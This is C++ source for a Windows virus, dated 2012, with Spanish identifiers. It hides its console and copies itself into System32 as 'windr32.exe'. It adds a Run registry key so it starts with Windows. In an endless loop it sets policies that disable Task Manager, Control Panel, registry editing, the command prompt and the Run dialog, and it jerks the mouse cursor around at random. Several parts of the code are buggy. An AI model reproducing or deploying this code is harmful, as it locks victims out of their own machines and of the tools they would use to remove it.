//////////////////////////////////////
//   zadyOne. - INVIERNO DE 2012    //
//////////////////////////////////////

#include <iostream.h>
#include <windows.h>
#include <stdio.h>

void moverAleatorio();
int crearKey(char *path);
void copiarVirus(char *camino);
char *getRuta();
void bloquear(char *bloqueo);

char* bloqueoUno = "DisableTaskMgr";
char* bloqueoDos = "NoControlPanel";
char* bloqueoTres = "DisableRegistryTools";
char* bloqueoCuatro = "DisableCMD";
char* bloqueoCinco = "NoRun";

int main(int argc, char* argv[]){
    FreeConsole();
    char *senda = getRuta();
    
    copiarVirus(senda);
    crearKey(senda);
    
     bloquear(bloqueoUno);
     bloquear(bloqueoDos);
     bloquear(bloqueoTres);
     bloquear(bloqueoCuatro);
     bloquear(bloqueoCinco);
    
    while(true){
     crearKey(senda);
     bloquear(bloqueoUno);
     bloquear(bloqueoDos);
     bloquear(bloqueoTres);
     bloquear(bloqueoCuatro);
     bloquear(bloqueoCinco);
      if(argv[0]=senda){
       moverAleatorio();
       }
    }
    return 0;
}

void moverAleatorio(){
     int mx, my;
     
     mx = GetSystemMetrics(SM_CXSCREEN) - 1;
     my = GetSystemMetrics(SM_CYSCREEN) - 1;
     
     SetCursorPos(1 + (rand() % mx), 1 + (rand() % my));
     
     _sleep(2000);
}

char *getRuta(){
     char *ruta = getenv("windir");
     strcat(ruta, "\\System32\\");
     return ruta;
}

int crearKey(char *path){
    int regKey, check;
    HKEY hkey;
    
    regKey = RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    
    if(regKey==0){
         RegSetValueEx((HKEY)hkey, "windr32", 0, REG_SZ, (BYTE*)path, strlen(path));
         check = 0;
         return check;
    }
    
    if(regKey!=0){
       check = 1;
       return check;
    }   
}

void copiarVirus(char *camino){
     char path[256];
     char nombre[] = "windr32";
     strcat(nombre, ".exe");
     strcat(camino, nombre);
     
     HMODULE exe = GetModuleHandle(0);
     
     GetModuleFileName(exe, path, 256);
     CopyFile(path, camino, false);
}

void bloquear(char *bloqueo){
     try{
      HKEY hBuffer = NULL, hMyKey = NULL;
      DWORD value = 1;
      
      if(bloqueo = "DisableCMD"){
      if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
      if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
         RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
         RegCloseKey(hMyKey);
      }
      }
      }
      
            if(bloqueo = "DisableTaskMgr"){
      if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
      if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
         RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
         RegCloseKey(hMyKey);
      }
      }
      }
      
            if(bloqueo = "NoRun"){
      if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
      if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
         RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
         RegCloseKey(hMyKey);
      }
      }
      }
      
            if(bloqueo = "NoControlPanel"){
      if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
      if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
         RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
         RegCloseKey(hMyKey);
      }
      }
      }
            if(bloqueo = "DisableRegistryTools"){
      if(RegOpenKeyEx(HKEY_CURRENT_USER, NULL, 0, KEY_WRITE, &hBuffer) == ERROR_SUCCESS){
      if(RegCreateKeyEx(hBuffer, "Software\\Policies\\Microsoft\\Windows\\System", 0, NULL, 0, KEY_WRITE, NULL, &hMyKey, NULL) == ERROR_SUCCESS){
         RegSetValueEx(hMyKey, bloqueo, 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
         RegCloseKey(hMyKey);
      }
      }
      }
           
     }
     catch(...){}
}

